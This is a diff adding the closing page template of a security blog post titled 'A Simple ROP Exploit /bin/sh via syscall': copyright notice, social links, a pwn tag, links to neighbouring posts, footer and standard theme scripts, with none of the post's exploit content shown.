+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/09/14/bin-sh-via-syscall/" title="A Simple ROP Exploit &#x2F;bin&#x2F;sh via syscall">https://fdlucifer.github.io/2021/09/14/bin-sh-via-syscall/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/14/mprotect-and-shellcode/" rel="prev" title="ROP Exploit MProtect() and Shellcode">
+                  <i class="fa fa-chevron-left"></i> ROP Exploit MProtect() and Shellcode
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/09/29/bolt/" rel="next" title="Hack-The-Box-walkthrough[bolt]">
+                  Hack-The-Box-walkthrough[bolt] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
